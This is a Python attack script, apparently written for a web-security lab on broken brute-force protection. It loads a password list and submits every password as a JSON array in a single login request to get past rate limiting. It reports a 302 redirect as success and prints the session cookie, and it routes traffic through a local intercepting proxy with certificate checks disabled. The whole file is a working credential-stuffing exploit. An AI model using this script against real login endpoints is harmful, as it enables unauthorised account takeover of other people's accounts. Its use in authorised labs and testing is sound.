#!/usr/bin/env python3
# Broken brute-force, multiple credentials per request
import requests
import sys

# Debugging
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
p = {'http':'http://127.0.0.1:8080', 'https':'http://127.0.0.1:8080'}

def pass_list(pass_path):
    with open(pass_path, 'r') as f:
        passlist = []
        for passwords in f.readlines():
            password = passwords.replace('\n','')
            passlist.append(f'{password}')
        return(passlist)

if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
        user = sys.argv[2].strip()
        password = sys.argv[3].strip()
    except IndexError:
        print("[-] Usage: {} <url> <user> <passwords>".format(sys.argv[0]))
        print("[-] Example: {} http://example.com/login admin password".format(sys.argv[0]))
        sys.exit(1)

    print("[+] Trying with username...  [{}]".format(user))
    passwd = pass_list(password)
    data = {"username":user, "password":passwd}
    req = requests.post(url, json=data, verify=False, proxies=p, allow_redirects=False)
    if req.status_code == 302:
        print("[+] Seems like success...")
        print("[-] Status code...           [{}]".format(req.status_code))
        print("[-] Follow redirect...       [{}]".format(url.replace('/login',req.headers['Location'])))
        print("[-] Get the cookies...       [{}]".format(str(req.cookies).split()[1]))